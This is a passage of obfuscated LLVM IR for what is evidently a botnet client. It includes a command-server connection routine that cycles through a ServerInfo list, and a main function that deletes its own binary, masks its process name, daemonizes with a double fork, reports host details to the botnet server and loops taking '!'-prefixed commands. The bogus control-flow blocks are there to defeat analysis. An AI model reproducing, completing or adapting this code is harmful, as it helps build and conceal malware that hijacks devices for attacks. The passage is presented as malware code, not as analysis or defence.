  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %33 [
    i32 66051, label %13
    i32 50462976, label %30
    i32 33751041, label %31
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  %14 = load i32, i32* @x.107
  %15 = load i32, i32* @y.108
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 ptrtoint ([11 x i8]* @.str.136 to i32), i32* %1, align 4
  %22 = load i32, i32* @x.107
  %23 = load i32, i32* @y.108
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:30:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.137 to i32), i32* %1, align 4
  br label %34

; <label>:31:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.138 to i32), i32* %1, align 4
  br label %34

; <label>:32:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.139 to i32), i32* %1, align 4
  br label %34

; <label>:33:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.140 to i32), i32* %1, align 4
  br label %34

; <label>:34:                                     ; preds = %33, %32, %31, %30, %originalBBpart2
  %35 = load i32, i32* %1, align 4
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 ptrtoint ([11 x i8]* @.str.136 to i32), i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @switchCommStock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.109
  %9 = load i32, i32* @y.110
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @switchCommStock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @switchCommStock, align 4
  %18 = load i32, i32* @x.109
  %19 = load i32, i32* @y.110
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @x.109
  %28 = load i32, i32* @y.110
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* @botnetServer, align 4
  %36 = add nsw i32 %35, 1
  %37 = sext i32 %36 to i64
  %38 = icmp eq i64 %37, 50
  %39 = load i32, i32* @x.109
  %40 = load i32, i32* @y.110
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart212
  store i32 0, i32* @botnetServer, align 4
  br label %51

; <label>:48:                                     ; preds = %originalBBpart212
  %49 = load i32, i32* @botnetServer, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* @botnetServer, align 4
  br label %51

; <label>:51:                                     ; preds = %48, %47
  %52 = load i32, i32* @x.109
  %53 = load i32, i32* @y.110
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %51
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %61 = load i32, i32* @botnetServer, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [100 x i32], [100 x i32]* @ServerInfo, i64 0, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = sext i32 %64 to i64
  %66 = inttoptr i64 %65 to i8*
  %67 = call i8* @strcpy(i8* %60, i8* %66) #3
  %68 = load i32, i32* @botnetServer, align 4
  store i32 %68, i32* %3, align 4
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %70 = call i8* @strchr(i8* %69, i32 58) #9
  %71 = icmp ne i8* %70, null
  %72 = load i32, i32* @x.109
  %73 = load i32, i32* @y.110
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %71, label %80, label %87

; <label>:80:                                     ; preds = %originalBBpart216
  %81 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %82 = call i8* @strchr(i8* %81, i32 58) #9
  %83 = getelementptr inbounds i8, i8* %82, i64 1
  %84 = call i32 @atoi(i8* %83) #9
  store i32 %84, i32* %3, align 4
  %85 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %86 = call i8* @strchr(i8* %85, i32 58) #9
  store i8 0, i8* %86, align 1
  br label %87

; <label>:87:                                     ; preds = %80, %originalBBpart216
  %88 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %88, i32* @switchCommStock, align 4
  %89 = load i32, i32* @switchCommStock, align 4
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %91 = load i32, i32* %3, align 4
  %92 = call i32 @connectTimeout(i32 %89, i8* %90, i32 %91, i32 30)
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %111, label %94

; <label>:94:                                     ; preds = %87
  %95 = load i32, i32* @x.109
  %96 = load i32, i32* @y.110
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %94
  store i32 1, i32* %1, align 4
  %103 = load i32, i32* @x.109
  %104 = load i32, i32* @y.110
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %128

; <label>:111:                                    ; preds = %87
  %112 = load i32, i32* @x.109
  %113 = load i32, i32* @y.110
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %111
  store i32 0, i32* %1, align 4
  %120 = load i32, i32* @x.109
  %121 = load i32, i32* @y.110
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %128

; <label>:128:                                    ; preds = %originalBBpart224, %originalBBpart220
  %129 = load i32, i32* %1, align 4
  ret i32 %129

originalBBalteredBB:                              ; preds = %originalBB, %7
  %130 = load i32, i32* @switchCommStock, align 4
  %131 = call i32 @close(i32 %130)
  store i32 0, i32* @switchCommStock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %132 = load i32, i32* @botnetServer, align 4
  %_ = sub i32 0, %132
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %132
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %132, 1
  %_5 = sub i32 0, %132
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 0, %132
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 %132, 1
  %gen10 = mul i32 %_9, 1
  %133 = add nsw i32 %132, 1
  %134 = sext i32 %133 to i64
  %135 = icmp eq i64 %134, 50
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %51
  %136 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %137 = load i32, i32* @botnetServer, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [100 x i32], [100 x i32]* @ServerInfo, i64 0, i64 %138
  %140 = load i32, i32* %139, align 4
  %141 = sext i32 %140 to i64
  %142 = inttoptr i64 %141 to i8*
  %143 = call i8* @strcpy(i8* %136, i8* %142) #3
  %144 = load i32, i32* @botnetServer, align 4
  store i32 %144, i32* %3, align 4
  %145 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %146 = call i8* @strchr(i8* %145, i32 58) #9
  %147 = icmp ne i8* %146, null
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %94
  store i32 1, i32* %1, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %111
  store i32 0, i32* %1, align 4
  br label %originalBB22
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.111
  %4 = load i32, i32* @y.112
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca [32 x i8], align 16
  %15 = alloca [32 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca [4096 x i8], align 16
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [10 x i8*], align 16
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  %33 = load i8**, i8*** %13, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @unlink(i8* %35) #3
  call void @rand_init()
  %37 = call i32 @rand_next()
  %38 = urem i32 %37, 4
  %39 = add i32 %38, 3
  %40 = mul i32 %39, 4
  store i32 %40, i32* %16, align 4
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %42 = load i32, i32* %16, align 4
  call void @rand_alphastr(i8* %41, i32 %42)
  %43 = load i32, i32* %16, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = load i8**, i8*** %13, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %50 = call i32 @util_strcpy(i8* %48, i8* %49)
  %51 = call i32 @rand_next()
  %52 = urem i32 %51, 6
  %53 = add i32 %52, 3
  %54 = mul i32 %53, 4
  store i32 %54, i32* %16, align 4
  %55 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %56 = load i32, i32* %16, align 4
  call void @rand_alphastr(i8* %55, i32 %56)
  %57 = load i32, i32* %16, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 %58
  store i8 0, i8* %59, align 1
  %60 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i32 0, i32 0
  %61 = call i32 (i32, ...) @prctl(i32 15, i8* %60) #3
  %62 = call i64 @time(i64* null) #3
  %63 = call i32 @getpid() #3
  %64 = sext i32 %63 to i64
  %65 = xor i64 %62, %64
  %66 = trunc i64 %65 to i32
  call void @srand(i32 %66) #3
  call void @rand_init()
  %67 = call i32 @getOurIP()
  %68 = call i32 @fork() #3
  store i32 %68, i32* %17, align 4
  %69 = icmp ne i32 %68, 0
  %70 = load i32, i32* @x.111
  %71 = load i32, i32* @y.112
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %69, label %78, label %97

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i32, i32* @x.111
  %80 = load i32, i32* @y.112
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %78
  %87 = load i32, i32* %17, align 4
  %88 = call i32 @waitpid(i32 %87, i32* %19, i32 0)
  call void @exit(i32 0) #11
  %89 = load i32, i32* @x.111
  %90 = load i32, i32* @y.112
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  unreachable

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* %17, align 4
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %143, label %100

; <label>:100:                                    ; preds = %97
  %101 = load i32, i32* @x.111
  %102 = load i32, i32* @y.112
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %100
  %109 = call i32 @fork() #3
  store i32 %109, i32* %18, align 4
  %110 = icmp ne i32 %109, 0
  %111 = load i32, i32* @x.111
  %112 = load i32, i32* @y.112
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %110, label %119, label %120

; <label>:119:                                    ; preds = %originalBBpart278
  call void @exit(i32 0) #11
  unreachable

; <label>:120:                                    ; preds = %originalBBpart278
  %121 = load i32, i32* %18, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %124, label %123

; <label>:123:                                    ; preds = %120
  br label %125

; <label>:124:                                    ; preds = %120
  br label %125

; <label>:125:                                    ; preds = %124, %123
  %126 = load i32, i32* @x.111
  %127 = load i32, i32* @y.112
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %125
  %134 = load i32, i32* @x.111
  %135 = load i32, i32* @y.112
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %142

; <label>:142:                                    ; preds = %originalBBpart282
  br label %144

; <label>:143:                                    ; preds = %97
  br label %144

; <label>:144:                                    ; preds = %143, %142
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0)) #3
  %147 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  br label %148

; <label>:148:                                    ; preds = %643, %151, %145
  %149 = call i32 @initConnection()
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %152

; <label>:151:                                    ; preds = %148
  br label %148

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* @x.111
  %154 = load i32, i32* @y.112
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %152
  %161 = load i32, i32* @switchCommStock, align 4
  %162 = call i8* @getBuild()
  %163 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %164 = call i8* @inet_ntoa(i32 %163) #3
  %165 = call i32 @getEndianness()
  %166 = call i8* @getBuildz()
  %167 = call i32 (i32, i8*, ...) @botnetPrint(i32 %161, i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.142, i32 0, i32 0), i8* %162, i8* %164, i32 %165, i8* %166)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  %168 = load i32, i32* @x.111
  %169 = load i32, i32* @y.112
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %176

; <label>:176:                                    ; preds = %642, %417, %originalBBpart286
  %177 = load i32, i32* @switchCommStock, align 4
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  %179 = call i32 @recvLine(i32 %177, i8* %178, i32 4096)
  store i32 %179, i32* %21, align 4
  %180 = icmp ne i32 %179, -1
  br i1 %180, label %181, label %643

; <label>:181:                                    ; preds = %176
  store i32 0, i32* %22, align 4
  br label %182

; <label>:182:                                    ; preds = %349, %181
  %183 = load i32, i32* %22, align 4
  %184 = sext i32 %183 to i64
  %185 = load i64, i64* @numpids, align 8
  %186 = icmp ult i64 %184, %185
  br i1 %186, label %187, label %352

; <label>:187:                                    ; preds = %182
  %188 = load i32*, i32** @pids, align 8
  %189 = load i32, i32* %22, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i32, i32* %188, i64 %190
  %192 = load i32, i32* %191, align 4
  %193 = call i32 @waitpid(i32 %192, i32* null, i32 1)
  %194 = icmp sgt i32 %193, 0
  br i1 %194, label %195, label %332

; <label>:195:                                    ; preds = %187
  %196 = load i32, i32* %22, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %24, align 4
  br label %198

; <label>:198:                                    ; preds = %originalBBpart2100, %195
  %199 = load i32, i32* @x.111
  %200 = load i32, i32* @y.112
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %198
  %207 = load i32, i32* %24, align 4
  %208 = zext i32 %207 to i64
  %209 = load i64, i64* @numpids, align 8
  %210 = icmp ult i64 %208, %209
  %211 = load i32, i32* @x.111
  %212 = load i32, i32* @y.112
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %210, label %219, label %249

; <label>:219:                                    ; preds = %originalBBpart290
  %220 = load i32*, i32** @pids, align 8
  %221 = load i32, i32* %24, align 4
  %222 = zext i32 %221 to i64
  %223 = getelementptr inbounds i32, i32* %220, i64 %222
  %224 = load i32, i32* %223, align 4
  %225 = load i32*, i32** @pids, align 8
  %226 = load i32, i32* %24, align 4
  %227 = sub i32 %226, 1
  %228 = zext i32 %227 to i64
  %229 = getelementptr inbounds i32, i32* %225, i64 %228
  store i32 %224, i32* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %219
  %231 = load i32, i32* @x.111
  %232 = load i32, i32* @y.112
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %230
  %239 = load i32, i32* %24, align 4
  %240 = add i32 %239, 1
  store i32 %240, i32* %24, align 4
  %241 = load i32, i32* @x.111
  %242 = load i32, i32* @y.112
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart2100, label %originalBB92alteredBB

originalBBpart2100:                               ; preds = %originalBB92
  br label %198

; <label>:249:                                    ; preds = %originalBBpart290
  %250 = load i32, i32* @x.111
  %251 = load i32, i32* @y.112
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %249
  %258 = load i32*, i32** @pids, align 8
  %259 = load i32, i32* %24, align 4
  %260 = sub i32 %259, 1
  %261 = zext i32 %260 to i64
  %262 = getelementptr inbounds i32, i32* %258, i64 %261
  store i32 0, i32* %262, align 4
  %263 = load i64, i64* @numpids, align 8
  %264 = add i64 %263, -1
  store i64 %264, i64* @numpids, align 8
  %265 = load i64, i64* @numpids, align 8
  %266 = add i64 %265, 1
  %267 = mul i64 %266, 4
  %268 = call noalias i8* @malloc(i64 %267) #3
  %269 = bitcast i8* %268 to i32*
  store i32* %269, i32** %23, align 8
  store i32 0, i32* %24, align 4
  %270 = load i32, i32* @x.111
  %271 = load i32, i32* @y.112
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart2144, label %originalBB102alteredBB

originalBBpart2144:                               ; preds = %originalBB102
  br label %278

; <label>:278:                                    ; preds = %325, %originalBBpart2144
  %279 = load i32, i32* @x.111
  %280 = load i32, i32* @y.112
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %278
  %287 = load i32, i32* %24, align 4
  %288 = zext i32 %287 to i64
  %289 = load i64, i64* @numpids, align 8
  %290 = icmp ult i64 %288, %289
  %291 = load i32, i32* @x.111
  %292 = load i32, i32* @y.112
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %290, label %299, label %328

; <label>:299:                                    ; preds = %originalBBpart2148
  %300 = load i32, i32* @x.111
  %301 = load i32, i32* @y.112
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %299
  %308 = load i32*, i32** @pids, align 8
  %309 = load i32, i32* %24, align 4
  %310 = zext i32 %309 to i64
  %311 = getelementptr inbounds i32, i32* %308, i64 %310
  %312 = load i32, i32* %311, align 4
  %313 = load i32*, i32** %23, align 8
  %314 = load i32, i32* %24, align 4
  %315 = zext i32 %314 to i64
  %316 = getelementptr inbounds i32, i32* %313, i64 %315
  store i32 %312, i32* %316, align 4
  %317 = load i32, i32* @x.111
  %318 = load i32, i32* @y.112
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %325

; <label>:325:                                    ; preds = %originalBBpart2152
  %326 = load i32, i32* %24, align 4
  %327 = add i32 %326, 1
  store i32 %327, i32* %24, align 4
  br label %278

; <label>:328:                                    ; preds = %originalBBpart2148
  %329 = load i32*, i32** @pids, align 8
  %330 = bitcast i32* %329 to i8*
  call void @free(i8* %330) #3
  %331 = load i32*, i32** %23, align 8
  store i32* %331, i32** @pids, align 8
  br label %332

; <label>:332:                                    ; preds = %328, %187
  %333 = load i32, i32* @x.111
  %334 = load i32, i32* @y.112
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %332
  %341 = load i32, i32* @x.111
  %342 = load i32, i32* @y.112
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %349

; <label>:349:                                    ; preds = %originalBBpart2156
  %350 = load i32, i32* %22, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %22, align 4
  br label %182

; <label>:352:                                    ; preds = %182
  %353 = load i32, i32* %21, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i64 0, i64 %354
  store i8 0, i8* %355, align 1
  %356 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %356)
  %357 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  store i8* %357, i8** %25, align 8
  %358 = load i8*, i8** %25, align 8
  %359 = load i8, i8* %358, align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 33
  br i1 %361, label %362, label %642

; <label>:362:                                    ; preds = %352
  %363 = load i8*, i8** %25, align 8
  %364 = getelementptr inbounds i8, i8* %363, i64 1
  store i8* %364, i8** %26, align 8
  br label %365

; <label>:365:                                    ; preds = %originalBBpart2164, %362
  %366 = load i32, i32* @x.111
  %367 = load i32, i32* @y.112
  %368 = sub i32 %366, 1
